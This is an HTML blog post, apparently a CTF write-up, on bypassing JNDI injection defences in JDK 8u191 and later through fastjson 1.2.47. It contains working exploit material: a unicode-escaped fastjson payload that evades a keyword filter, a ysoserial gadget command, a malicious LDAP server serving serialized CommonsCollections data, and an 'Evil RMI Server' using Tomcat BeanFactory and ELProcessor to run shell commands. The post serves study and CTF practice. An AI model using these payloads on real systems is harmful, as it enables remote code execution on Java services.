@@ -1,0 +1,516 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>JDK8u191版本后的JNDI注入绕过 | 秋嘞个秋</title>
+<link rel="shortcut icon" href="https://sl3epf.github.io/favicon.ico?v=1710164223744">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://sl3epf.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="JDK8u191版本后的JNDI注入绕过 | 秋嘞个秋 - Atom Feed" href="https://sl3epf.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+前言
+最近又看了下fastjson，想到之前某个比赛一道题，这两天又拿起来看了看。
+分析
+首先看题目和依赖
+
+
+第一眼就看到fastjson1.2.47，这个版本肯定是可以打的，就是通过反序列化往mapping中添加任何类，这样的话添加c..." />
+    <meta name="keywords" content="Java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://sl3epf.github.io">
+  <img class="avatar" src="https://sl3epf.github.io/images/avatar.png?v=1710164223744" alt="">
+  </a>
+  <h1 class="site-title">
+    秋嘞个秋
+  </h1>
+  <p class="site-description">
+    弃我去者，昨日之日不可留
+<br/>
+乱我心者，今日之日多烦忧
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              JDK8u191版本后的JNDI注入绕过
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-23
+              </span>
+              <span>
+                12 min read
+              </span>
+              
+                <a href="https://sl3epf.github.io/tag/_UMJ5ACaV/" class="post-tag">
+                  # Java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <!-- more -->
+<h1 id="前言">前言</h1>
+<p>最近又看了下fastjson，想到之前某个比赛一道题，这两天又拿起来看了看。</p>
+<h1 id="分析">分析</h1>
+<p>首先看题目和依赖<br>
+<img src="https://sl3epf.github.io/post-images/1703308816770.jpg" alt="" loading="lazy"><br>
+<img src="https://sl3epf.github.io/post-images/1703308825351.jpg" alt="" loading="lazy"><br>
+第一眼就看到fastjson1.2.47，这个版本肯定是可以打的，就是通过反序列化往<code>mapping</code>中添加任何类，这样的话添加<code>com.sun.rowset.JdbcRoSetImpl</code>类，从而绕过<code>autoTypeSupport</code>的和黑名单的限制，然后再次传递json去触发<code>JdbcRowSetImpl</code>的JNDI注入。<br>
+其中可以发现它还有这些正则限制</p>
+<pre><code class="language-java">Pattern p = Pattern.compile(&quot;JdbcRowSetImpl|type|dataSourceName|autoCommit|TemplatesImpl|bytecodes|BasicDataSource&quot;, 8);
+        boolean isMatch = p.matcher(decode).find();
+        if (!isMatch)
+            try {
+                JSON.parse(decode);
+            } catch (Exception e) {
+                resp = &quot;Maybe Username or Password error!&quot;;
+            }
+</code></pre>
+<p>这个地方的话，我们可以知道Fastjson默认会去除键、值外的空格、<code>\b</code>、<code>\n</code>、<code>\r</code>、<code>\f</code>等，同时还会自动将键与值进行unicode与十六进制解码。<br>
+我们采用一个关键字编码绕过就可以</p>
+<pre><code class="language-java">{
+    &quot;1&quot;: {
+        &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;, 
+        &quot;val&quot;: &quot;com.sun.rowset.\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;
+    }, 
+    &quot;2&quot;: {
+        &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;com.sun.rowset.\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;, 
+        &quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;: &quot;ldap://127.0.0.1:6666/Evail&quot;, 
+        &quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&quot;: true
+    }
+}
+</code></pre>
+<p>这个开始在本地打用jdk8u65低版本是没有问题的。<br>
+但是在远程打并不能通。于是最开始考虑是不是不出网<br>
+又考虑到了<code>Templates</code>链要开启<code>Feature.SupportNonPublicField</code>，<code>BCEL、c3p0、Commons-io</code>都是没有这个依赖的。<br>
+但是我们在题目中看到了这两个依赖</p>
+<pre><code>        &lt;dependency&gt;
+            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+            &lt;version&gt;3.2.1&lt;/version&gt;
+        &lt;/dependency&gt;
+
+        &lt;dependency&gt;
+            &lt;groupId&gt;com.unboundid&lt;/groupId&gt;
+            &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;
+            &lt;version&gt;4.0.8&lt;/version&gt;
+            &lt;scope&gt;test&lt;/scope&gt;
+        &lt;/dependency&gt;
+</code></pre>
+<p>前面的CC很熟悉，后面那个是用于与 LDAP 目录服务器进行通信的一个java库<br>
+这会不会就是出题人提示呢，绕过高版本jdk实现jndi注入打CC链</p>
+<h1 id="绕过">绕过</h1>
+<p>所以现在就来学习一下</p>
+<p>我们主要来分析RMI和LDAP两个攻击向量<br>
+不做具体调试了，就看新旧版本的源码对比</p>
+<h2 id="rmi">RMI</h2>
+<p>在JDK 6u141、7u131、8u121之后，增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项。<br>
+对比下JDK的com.sun.jndi.rmi.registry.RegistryContext类的decodeObject()函数<br>
+我这里新版用的jdk8u391,旧版是8u65</p>
+<pre><code class="language-java">//8u391
+private Object decodeObject(Remote var1, Name var2) throws NamingException {
+        try {
+            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
+            Reference var8 = null;
+            if (var3 instanceof Reference) {
+                var8 = (Reference)var3;
+            } else if (var3 instanceof Referenceable) {
+                var8 = ((Referenceable)((Referenceable)var3)).getReference();
+            }
+
+            if (var8 != null &amp;&amp; var8.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase) {
+                throw new ConfigurationException(&quot;The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.&quot;);
+            } else {
+                return NamingManager.getObjectInstance(var3, var2, this, this.environment);
+            }
+        } catch (NamingException var5) {
+            throw var5;
+        } catch (RemoteException var6) {
+            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
+        } catch (Exception var7) {
+            NamingException var4 = new NamingException();
+            var4.setRootCause(var7);
+            throw var4;
+        }
+    }
+
+    //8u65
+    private Object decodeObject(Remote var1, Name var2) throws NamingException {
+        try {
+            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
+            return NamingManager.getObjectInstance(var3, var2, this, this.environment);
+        } catch (NamingException var5) {
+            throw var5;
+        } catch (RemoteException var6) {
+            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
+        } catch (Exception var7) {
+            NamingException var4 = new NamingException();
+            var4.setRootCause(var7);
+            throw var4;
+        }
+    }
+</code></pre>
+<p>主要就是加了一个if判断<code>com.sun.jndi.rmi.object.trustURLCodebase</code>是否为true才能调用getObjectInstance，最后调用loadClass进行类加载，而codebase默认为false</p>
+<h2 id="ldap">LDAP</h2>
+<p>ldap的利用在JDK 6u211、7u201、8u191之后，增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项。<br>
+关注com.sun.naming.internal.VersionHelper12#loadClass方法</p>
+<pre><code class="language-java">//8u391
+public Class&lt;?&gt; loadClass(String className, String codebase)
+            throws ClassNotFoundException, MalformedURLException {
+        if (&quot;true&quot;.equalsIgnoreCase(trustURLCodebase)) {
+            ClassLoader parent = getContextClassLoader();
+            ClassLoader cl =
+                    URLClassLoader.newInstance(getUrlArray(codebase), parent);
+
+            return loadClass(className, cl);
+        } else {
+            return null;
+        }
+    }
+
+    //8u65
+    public Class&lt;?&gt; loadClass(String className, String codebase)
+            throws ClassNotFoundException, MalformedURLException {
+
+        ClassLoader parent = getContextClassLoader();
+        ClassLoader cl =
+                 URLClassLoader.newInstance(getUrlArray(codebase), parent);
+
+        return loadClass(className, cl);
+    }
+</code></pre>
+<p>同样也是加了一个if判断com.sun.jndi.ldap.object.trustURLCodebase是否为true，然后才能调用URLClassLoader加载器。<br>
+而codebase默认是被设置为false</p>
+<pre><code class="language-java">    private static final String TRUST_URL_CODEBASE_PROPERTY =
+            &quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;;
+    private static final String trustURLCodebase =
+            AccessController.doPrivileged(
+                new PrivilegedAction&lt;String&gt;() {
+                    public String run() {
+                        try {
+                        return System.getProperty(TRUST_URL_CODEBASE_PROPERTY,
+                            &quot;false&quot;);
+                        } catch (SecurityException e) {
+                        return &quot;false&quot;;
+                        }
+                    }
+                }
+            );
+</code></pre>
+<p>如何绕过呢？根据https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA 有两种绕过方式</p>
+<pre><code>两种绕过方法如下：
+
+1. 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Object Factory工厂类，并利用这个本地的Factory类执行命令。
+
+2. 利用LDAP直接返回一个恶意的序列化对象，JNDI注入会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。
+
+这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。
+</code></pre>
+<h2 id="一-利用ldap返回恶意序列化数据触发本地依赖中的gadget">一、利用LDAP返回恶意序列化数据，触发本地依赖中的Gadget</h2>
+<p>我们首先来看第二种利用方式，这也是上面题目的利用点<br>
+题目中存在CC链依赖，我们可以利用CC6或者其他的链去打<br>
+先利用yuserial生成paylaod，然后base64编码一下</p>
+<pre><code>java -jar ysuserial-1.5-su18-all.jar -g CommonsCollections9 -p 'open -a /System/Applications/Calculator.app' -f 9.ser
+
+
+package Qiu;
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+
+public class B64Evil {
+    public static void main(String[] args) throws IOException {
+        byte[] code = Files.readAllBytes(Paths.get(&quot;/xxxx/9.ser&quot;));
+
+        System.out.println(Base64.getEncoder().encodeToString(code));
+    }
+}
+
+</code></pre>
+<p>然后构造恶意server端</p>
+<pre><code class="language-java">package Qiu;
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+import com.unboundid.util.Base64;
+
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import java.net.InetAddress;
+import java.net.URL;
+//高版本LDAP绕过
+
+public class LDAPServer {
+    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
+
+    public static void main ( String[] tmp_args ) throws Exception{
+        String[] args=new String[]{&quot;http:/127.0.0.1:3377/#Evail&quot;};
+        int port = 6666;
+
+        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+        config.setListenerConfigs(new InMemoryListenerConfig(
+                &quot;listen&quot;, //$NON-NLS-1$
+                InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$
+                port,
+                ServerSocketFactory.getDefault(),
+                SocketFactory.getDefault(),
+                (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
+        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+        System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);
+        ds.startListening();
+    }
+
+    private static class OperationInterceptor extends InMemoryOperationInterceptor {
+
+        private URL codebase;
+
+        public OperationInterceptor ( URL cb ) {
+            this.codebase = cb;
+        }
+
+        @Override
+        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
+            String base = result.getRequest().getBaseDN();
+            Entry e = new Entry(base);
+            try {
+                sendResult(result, base, e);
+            }
+            catch ( Exception e1 ) {
+                e1.printStackTrace();
+            }
+        }
+
+        protected void sendResult (InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
+            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(&quot;.class&quot;));
+            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);
+            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);
+            String cbstring = this.codebase.toString();
+            int refPos = cbstring.indexOf('#');
+            if ( refPos &gt; 0 ) {
+                cbstring = cbstring.substring(0, refPos);
+            }
+
+            e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;放入你刚刚生成的payload&quot;));
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        }
+    }
+}
+</code></pre>
+<p>将jdbcrowImpl链子base64编码<br>
+<img src="https://sl3epf.github.io/post-images/1703318150626.png" alt="" loading="lazy"><br>
+然后打入<br>
+<img src="https://sl3epf.github.io/post-images/1703318226979.png" alt="" loading="lazy"><br>
+发现成功执行<br>
+我们的server端也收到了请求<br>
+<img src="https://sl3epf.github.io/post-images/1703318305511.png" alt="" loading="lazy"></p>
+<h2 id="二-本地恶意类作为reference-factory">二、本地恶意类作为Reference Factory</h2>
+<p>主要就是受害者本地ClassPath能存在一个Factory Class并且必须实现 <code>javax.naming.spi.ObjectFactory</code>接口，并且至少存在一个<code>getObjectInstance()</code>方法<br>
+大佬就找到了这个<code>org.apache.naming.factory.BeanFactory</code><br>
+<img src="https://sl3epf.github.io/post-images/1703319774096.png" alt="" loading="lazy"></p>
+<p>需要依赖</p>
+<pre><code class="language-maven">&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
+    &lt;version&gt;8.5.0&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.el&lt;/groupId&gt;
+    &lt;artifactId&gt;com.springsource.org.apache.el&lt;/artifactId&gt;
+    &lt;version&gt;7.0.26&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>但是这个el的包我下不下来，就直接去网上找了个<br>
+https://archiva-repository.apache.org/archiva/repository/all-public/org/apache/el/com.springsource.org.apache.el/7.0.26/<br>
+然后导入了<br>
+RMI Server端</p>
+<pre><code class="language-java">package org.example;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import org.apache.naming.ResourceRef;
+
+import javax.naming.StringRefAddr;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RmiServer {
+    public static void main(String[] args) throws Exception {
+        System.out.println(&quot;[*]Evil RMI Server is Listening on port: 3377&quot;);
+        Registry registry = LocateRegistry.createRegistry(3377);
+        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
+        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);
+        // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码
+        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));
+        // 利用表达式执行命令
+        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash', '-c', 'open -na Calculator']).start()\&quot;)&quot;));
+        System.out.println(&quot;[*]Evil command: open -na Calculator&quot;);
+        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
+        registry.bind(&quot;Object&quot;, referenceWrapper);
+    }
+}
+</code></pre>
+<p>RMI Client端</p>
+<pre><code class="language-java">package org.example;
+
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+public class JNDI_TEST {
+    public static void main(String[] args) throws NamingException {
+        Object object=new InitialContext().lookup(&quot;rmi://127.0.0.1:3377/Object&quot;);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://sl3epf.github.io/post-images/1703323409532.png" alt="" loading="lazy"></figure>
+<p>这里主要记录利用手法。<br>
+具体漏洞分析流程网上大佬已经写的很清楚了。再造轮子写没啥太大意义，主要是自己调一遍理解一下。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E5%88%86%E6%9E%90">分析</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87">绕过</a>
+<ul>
+<li><a href="#rmi">RMI</a></li>
+<li><a href="#ldap">LDAP</a></li>
+<li><a href="#%E4%B8%80-%E5%88%A9%E7%94%A8ldap%E8%BF%94%E5%9B%9E%E6%81%B6%E6%84%8F%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0%E4%BE%9D%E8%B5%96%E4%B8%AD%E7%9A%84gadget">一、利用LDAP返回恶意序列化数据，触发本地依赖中的Gadget</a></li>
+<li><a href="#%E4%BA%8C-%E6%9C%AC%E5%9C%B0%E6%81%B6%E6%84%8F%E7%B1%BB%E4%BD%9C%E4%B8%BAreference-factory">二、本地恶意类作为Reference Factory</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://sl3epf.github.io/post/test-my-site/">
+              <h3 class="post-title">
+                换个地.
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Friends: <a href="https://zjackky.github.io/" target="_blank">zjackky</a>&nbsp;<a href="https://jaspersec.top/" target="_blank">jasper</a>&nbsp;<a href="https://zikh26.github.io/" target="_blank">zikh26</a>&nbsp;<a href="http://payioad.com/" target="_blank">payioad</a>&nbsp;
+<a href="http://blog.ldsecurity.cn/" target="_blank">凌度</a>&nbsp;<a href="http://www.aiwin.fun/" target="_blank">aiwin</a>&nbsp;
+  <a class="rss" href="https://sl3epf.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
